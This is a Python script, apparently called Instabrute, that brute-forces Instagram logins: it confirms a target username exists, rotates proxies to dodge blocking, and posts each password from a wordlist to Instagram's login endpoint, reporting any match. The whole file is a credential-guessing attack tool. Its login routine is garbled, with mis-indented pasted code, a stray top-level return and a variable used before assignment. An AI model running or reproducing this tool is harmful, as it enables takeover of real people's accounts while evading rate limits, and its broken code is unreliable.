import requests
import json
import time
import os
import random
import sys

#Help function
def Input(text):
	value = ''
	if sys.version_info.major > 2:
		value = input(text)
	else:
		value = raw_input(text)
	return str(value)

#The main class
class Instabrute():
	def __init__(self, username, passwordsFile='pass.txt'):
		self.username = username
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = passwordsFile
		
		#Check if passwords file exists
		self.loadPasswords()
		#Check if username exists
		self.IsUserExists()


		UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
			self.randomProxy()


	#Check if password file exists and check if he contain passwords
	def loadPasswords(self):
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print ('[*] %s Passwords loads successfully' % passwordsNumber)
				else:
					print('Password file are empty, Please add passwords to it.')
					Input('[*] Press enter to exit')
					exit()
		else:
			print ('Please create passwords file named "%s"' % self.passwordsFile)
			Input('[*] Press enter to exit')
			exit()

	#Choose random proxy from proxys file
	def randomProxy(self):
		plist = open('proxy.txt').read().splitlines()
		proxy = random.choice(plist)

		if not proxy in self.UsedProxys:
			self.CurrentProxy = proxy
			self.UsedProxys.append(proxy)
		try:
			print('')
			print('[*] Check new ip...')
			print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=1000000.0).text)
		except Exception as e:
			print  ('[*] Can\'t reach proxy "%s"' % proxy)
		print('')


	#Check if username exists in instagram server
	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if (r.status_code == 404):
			print ('[*] User named "%s" not found' % username)
			Input('[*] Press enter to exit')
			exit()
		elif (r.status_code == 200):
			return True

	#Try to login with password
	def Login(self, password):
		sess = requests.Session()

		if len(self.CurrentProxy) > 0:
			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

		#build requests headers
	        cookies = r.cookies.get_dict()
csrftoken = cookies.get('csrftoken')

if csrftoken:
    sess.headers.update({'X-CSRFToken': csrftoken})
else:
    print("Error: 'csrftoken' not found in cookies. Response might have failed.")
    print("Response status:", r.status_code)
    print("Response body:", r.text)
    return None  # or handle this case as needed
	headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'
}
r = requests.get("https://www.instagram.com/accounts/login/", headers=headers)

		#Update token after enter to the site
		r = sess.get('https://www.instagram.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		#Update token after login to the site 
		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
		
		#parse response
		data = json.loads(r.text)
		if (data['status'] == 'fail'):
			print (data['message'])

			UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
				print ('[$] Try to use proxy after fail.')
				randomProxy() #Check that, may contain bugs
			return False

		#return session if password is correct 
		if (data['authenticated'] == True):
			return sess 
		else:
			return False






instabrute = Instabrute(Input('Please enter a username: '))

try:
	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
except Exception as e:
	print ('[*] Error, software use the defult value "4"')
	delayLoop = 4
print ('')



for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		print ('[*] Login success %s' % [instabrute.username,password])
	else:
		print ('[*] Password incorrect [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input('Type y/n to exit: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YES'):
			exit()
		else:
			continue
		
